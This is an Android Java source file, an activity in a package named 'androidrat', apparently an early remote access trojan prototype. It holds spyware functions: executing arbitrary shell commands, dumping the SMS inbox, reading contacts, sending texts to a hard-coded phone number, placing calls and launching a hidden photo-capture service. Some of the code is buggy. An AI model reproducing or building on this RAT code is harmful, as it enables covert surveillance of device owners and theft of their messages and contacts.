package com.ot.androidrat;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import android.Manifest;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.telephony.SmsManager;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

import org.w3c.dom.Text;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.ArrayList;

public class MainActivity extends AppCompatActivity {

    private static final String INBOX = "content://sms/inbox";
    private static final String SENT = "content://sms/sent";
    private static final String DRAFT = "content://sms/draft";

    private static final int MY_PERMISSIONS_REQUEST_SEND_SMS =0 ;

    private EditText command;
    private TextView shellResult;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Button smsBtn = (Button) findViewById(R.id.read_sms_btn);
        Button picBtn = (Button) findViewById(R.id.pic_btn);
        Button shellBtn = (Button) findViewById(R.id.shell_btn);
        command = (EditText) findViewById(R.id.cmd_txt);
        shellResult = (TextView) findViewById(R.id.shell_txt);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
    }

    public void executeShell(View view){
        try{
            Process su = Runtime.getRuntime().exec(command.getText().toString());
            StringBuilder output = new StringBuilder();
            BufferedReader reader = new BufferedReader(new InputStreamReader(su.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null){
                output.append(line + "\n");
            }
            shellResult.setText(output);
        }catch (IOException ioException){

        }
    }

    public void sendSMS(View view){
        String phoneNo = "+2348185571169", message = "test";
        if(ContextCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED){
            ActivityCompat.requestPermissions(this,
                    new String[]{Manifest.permission.SEND_SMS}, MY_PERMISSIONS_REQUEST_SEND_SMS);
        }
        if(ContextCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS) == PackageManager.PERMISSION_GRANTED){
            SmsManager smsManager = SmsManager.getDefault();
            smsManager.sendTextMessage(phoneNo, null, message, null, null);
        }
    }

    public void call(View view){
        Intent callIntent = new Intent(Intent.ACTION_CALL);
        callIntent.setData(Uri.parse("tel:" + 12345678));
        startActivity(callIntent);
    }

    private void readContacts(View view) {
        ArrayList<String> contactList = new ArrayList<>();
        ContentResolver contentResolver=getContentResolver();
        Cursor cursor=contentResolver.query(ContactsContract.Contacts.CONTENT_URI,null,null,null,null);
        if (cursor.moveToFirst()){
            do {
                contactList.add(cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)));
            }while (cursor.moveToNext());
        }
        shellResult.setText(contactList.toArray().toString());
    }

    public void takePicture(View view){
        Intent service = new Intent(getBaseContext(), CapturePhoto.class);
        startService(service);
    }

    public void showSMS(View view){
        StringBuilder messages = new StringBuilder();
        Cursor cursor = getContentResolver().query(Uri.parse(INBOX), null, null,null,null);
        if(cursor.moveToFirst()){
            do {
                for(int i = 0; i <= cursor.getColumnCount(); i++){
                    messages.append(cursor.getColumnName(i)).append(": ").append(cursor.getString(i)).append("\n");
                }
            }while (cursor.moveToNext());
            Toast.makeText(this, messages.toString(), Toast.LENGTH_LONG).show();
            System.out.println(messages);
        }else{
            System.out.println("No messages");
        }

    }
}